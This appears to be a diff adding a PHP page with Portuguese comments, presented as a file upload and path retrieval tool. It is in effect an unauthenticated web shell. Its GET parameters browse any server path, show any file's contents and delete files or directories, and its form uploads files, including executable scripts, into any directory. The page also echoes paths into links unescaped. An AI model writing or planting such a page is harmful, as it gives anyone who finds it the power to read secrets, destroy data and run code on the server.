@@ -1,0 +1,131 @@
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+// Função para listar os diretórios
+function listDirectories($path) {
+    $directories = [];
+    $files = scandir($path);
+    foreach ($files as $file) {
+        if (is_dir($path . '/' . $file) && $file != '.' && $file != '..') {
+            $directories[] = $file;
+        }
+    }
+    return $directories;
+}
+
+// Função para exibir os arquivos e diretórios
+function displayFilesAndDirectories($path) {
+    echo '<b>Realpath:</b> ' . realpath($path) . '<br />';
+    echo '<b>Type:</b> ';
+
+    if (is_dir($path)) {
+        echo 'Directory <br />';
+        echo '<b>Directories:</b><br />';
+        $directories = listDirectories($path);
+        foreach ($directories as $directory) {
+            echo "<a href=\"?path=$path/$directory\">$directory</a> | ";
+            echo "<a href=\"?delete=$path/$directory\">Delete</a><br />";
+        }
+        echo '<br /><b>Files:</b><br />';
+        foreach (scandir($path) as $data) {
+            if (!is_dir($path . '/' . $data)) {
+                echo "<a href=\"?view=$path/$data\">$data</a> | ";
+                echo "<a href=\"?delete=$path/$data\">Delete</a><br />";
+            }
+        }
+    } else {
+        echo 'File <br />';
+        echo htmlentities(file_get_contents($path)) . " | ";
+        echo "<a href=\"?delete=$path\">Delete</a><br />";
+    }
+}
+
+// Handle file retrieval form
+if (isset($_GET['path'])) {
+    $path = empty($_GET['path']) ? './' : $_GET['path'];
+    displayFilesAndDirectories($path);
+}
+
+// Handle file viewing
+if (isset($_GET['view'])) {
+    $fileToView = $_GET['view'];
+    if (is_file($fileToView)) {
+        echo "<h3>Viewing file: " . htmlspecialchars($fileToView) . "</h3>";
+        echo "<pre>" . htmlentities(file_get_contents($fileToView)) . "</pre>";
+    } else {
+        echo "O arquivo especificado não existe.";
+    }
+}
+
+// Handle file deletion
+if (isset($_GET['delete'])) {
+    $fileToDelete = $_GET['delete'];
+    if (is_file($fileToDelete) || is_dir($fileToDelete)) {
+        if (is_dir($fileToDelete)) {
+            rmdir($fileToDelete); // rmdir deve ser usado para deletar diretórios
+            echo "O diretório foi excluído com sucesso.";
+        } elseif (unlink($fileToDelete)) {
+            echo "O arquivo foi excluído com sucesso.";
+        } else {
+            echo "Desculpe, ocorreu um erro ao excluir o arquivo/diretório.";
+        }
+    } else {
+        echo "O arquivo/diretório especificado não existe.";
+    }
+}
+
+// Handle file upload
+if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["fileToUpload"])) {
+    $targetDir = isset($_GET['path']) ? $_GET['path'] : './'; // Set target directory to current path or root if not specified
+    $targetFile = $targetDir . '/' . basename($_FILES["fileToUpload"]["name"]);
+
+    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
+        echo "O arquivo " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " foi enviado com sucesso.";
+    } else {
+        echo "Desculpe, ocorreu um erro ao enviar o arquivo.";
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Upload and Path Retrieval</title>
+</head>
+<body>
+
+<b>Retrieve</b> <br />
+Current file path: <?php echo __FILE__; ?> <br />
+<form method="GET" action="">
+    Path: <input type="text" name="path" size="50" value="<?php if (isset($_GET['path'])) { echo htmlspecialchars($_GET['path']); } ?>" />
+    <button type="submit">Go</button>
+</form>
+<pre>
+
+<?php
+// Display file retrieval results here
+if (isset($_GET['path'])) {
+    displayFilesAndDirectories($_GET['path']);
+}
+?>
+
+</pre>
+
+<b>Upload</b> <br />
+<form action="" method="post" enctype="multipart/form-data">
+    Selecione o arquivo para enviar:
+    <input type="file" name="fileToUpload" id="fileToUpload">
+    <input type="submit" value="Enviar Arquivo" name="submit">
+</form>
+
+<b>Delete</b> <br />
+<form method="GET" action="">
+    File/Directory Path to Delete: <input type="text" name="delete" size="50" value="<?php if (isset($_GET['delete'])) { echo htmlspecialchars($_GET['delete']); } ?>" />
+    <button type="submit">Delete</button>
+</form>
+
+</body>
+</html>
